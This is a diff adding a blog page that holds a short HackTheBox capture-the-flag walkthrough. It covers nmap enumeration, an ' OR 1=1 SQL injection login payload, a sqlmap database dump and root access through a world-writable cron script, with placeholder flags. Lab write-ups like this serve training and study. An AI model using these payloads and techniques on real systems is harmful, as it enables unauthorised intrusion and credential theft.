@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HTB: Connected — Full Walkthrough — natashi</title>
+  <meta name="description" content="Exploiting SQL injection to RCE on a HackTheBox machine, covering enumeration through privilege escalation.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+
+  <canvas id="particles"></canvas>
+
+  <nav class="navbar">
+    <a href="../index.html" class="nav-logo">
+      <span class="logo-bracket">[</span>natashi<span class="logo-bracket">]</span>
+    </a>
+    <div class="nav-links">
+      <a href="../index.html" class="nav-link">Home</a>
+      <a href="../writeups.html" class="nav-link">Writeups</a>
+      <a href="../notes.html" class="nav-link">Notes</a>
+      <a href="../about.html" class="nav-link">About</a>
+    </div>
+  </nav>
+
+  <main class="container page-content">
+    <article class="post-article">
+      <div class="post-article-header">
+        <a href="../writeups.html" class="back-link">← Back to Writeups</a>
+        <div class="post-article-meta">
+          <span class="post-category">writeup</span>
+          <span class="post-date">2025-06-20</span>
+        </div>
+        <h1 class="post-article-title">HTB: Connected — Full Walkthrough</h1>
+        <div class="post-tags"><span class="post-tag">#htb</span><span class="post-tag">#sqli</span><span class="post-tag">#rce</span></div>
+      </div>
+      <div class="post-article-body">
+        <h2>Enumeration</h2>
+<p>Started with a full port scan using nmap:</p>
+<pre><code class="language-bash">nmap -sC -sV -p- connected.htb
+</code></pre>
+<p>Found ports <strong>22 (SSH)</strong>, <strong>80 (HTTP)</strong>, and <strong>3306 (MySQL)</strong> open.</p>
+<h3>Web Application</h3>
+<p>The web application had a login form vulnerable to <strong>error-based SQL injection</strong>:</p>
+<pre><code class="language-sql">&#39; OR 1=1 -- -
+</code></pre>
+<h2>Exploitation</h2>
+<p>After confirming the injection point, I extracted database credentials:</p>
+<pre><code class="language-bash">sqlmap -u &quot;http://connected.htb/login&quot; --data=&quot;user=admin&amp;pass=test&quot; --dbs
+</code></pre>
+<blockquote>
+<p>The database was running MySQL 8.0 with <code>FILE</code> privileges enabled.</p>
+</blockquote>
+<h2>Privilege Escalation</h2>
+<p>Found a cronjob running as root:</p>
+<pre><code class="language-bash">cat /etc/crontab
+# * * * * * root /opt/scripts/backup.sh
+</code></pre>
+<p>The script was <strong>world-writable</strong>, so injecting a reverse shell gave root access.</p>
+<h2>Flags</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>User</td>
+<td><code>htb{user_flag_here}</code></td>
+</tr>
+<tr>
+<td>Root</td>
+<td><code>htb{root_flag_here}</code></td>
+</tr>
+</tbody></table>
+
+      </div>
+    </article>
+  </main>
+
+  <footer class="footer">
+    <p>© 2025 natashi — built with ☕ and curiosity</p>
+  </footer>
+
+  <script src="../script.js"></script>
+</body>
+</html>
